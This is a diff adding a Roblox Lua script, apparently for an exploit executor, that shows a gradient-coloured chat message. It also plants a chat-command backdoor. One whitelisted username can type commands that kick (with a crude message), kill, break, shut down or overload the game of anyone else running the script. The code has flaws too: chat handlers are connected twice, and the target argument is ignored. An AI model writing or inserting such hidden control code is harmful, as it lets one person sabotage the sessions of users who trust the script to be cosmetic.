@@ -1,1 +1,93 @@
 
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local text = "test test test"
+local color1 = Color3.fromRGB(200, 160, 220)
+local color2 = Color3.fromRGB(180, 0, 200)
+
+local Gradientset = function(color1, color2, alpha)
+    return Color3.new(
+        color1.R + (color2.R - color1.R) * alpha,
+        color1.G + (color2.G - color1.G) * alpha,
+        color1.B + (color2.B - color1.B) * alpha
+    )
+end
+
+local Gradient = function(text, color1, color2)
+    local result = ""
+
+    for i = 1, #text do
+        local alpha = (i - 1) / (#text - 1)
+        local color = Gradientset(color1, color2, alpha)
+        local colorCode = string.format("%02X%02X%02X", math.floor(color.R * 255), math.floor(color.G * 255), math.floor(color.B * 255))
+        result = result .. '<font color="#' .. colorCode .. '">' .. text:sub(i, i) .. '</font>'
+    end
+
+    return result
+end
+
+local gradientText = Gradient(text, color1, color2)
+
+local whitelist = {
+    ["justin12281oom"] = true
+}
+
+local commands = {
+    ["lagback"] = function(player)
+        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
+    end,
+    ["leave"] = function(player)
+        game:Shutdown()
+    end,
+    ["kick"] = function(player)
+        game.Players.LocalPlayer:Kick("Want to fuck Skibidi toilet", false)
+    end,
+    ["Executerkill"] = function(player)
+        task.spawn(setfpscap, 9e9)
+    end,
+    ["kill"] = function(player)
+        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+    end,
+    ["stun"]  = function(player)
+        game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"):Destroy()
+    end
+}
+
+local function onChatMessage(player, message)
+    local command, targetPlayerName = message:match("^;(%w+)%s*(%S*)")
+    if command and commands[command] then
+        if whitelist[player.Name] then
+            local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
+            if targetPlayer and not whitelist[targetPlayer.Name] then
+                commands[command](player, targetPlayer)
+            end
+        end
+    end
+end
+
+local function onPlayerChatted(player)
+    player.Chatted:Connect(function(message)
+        onChatMessage(player, message)
+    end)
+end
+
+local function applyGradientToChat()
+    if whitelist[Players.LocalPlayer.Name] then 
+        StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = gradientText,
+        })
+    end    
+end
+
+Players.PlayerAdded:Connect(function(player)
+    onPlayerChatted(player)
+end)
+
+applyGradientToChat()
+
+Players.PlayerAdded:Connect(onPlayerChatted)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    onPlayerChatted(player)
+end
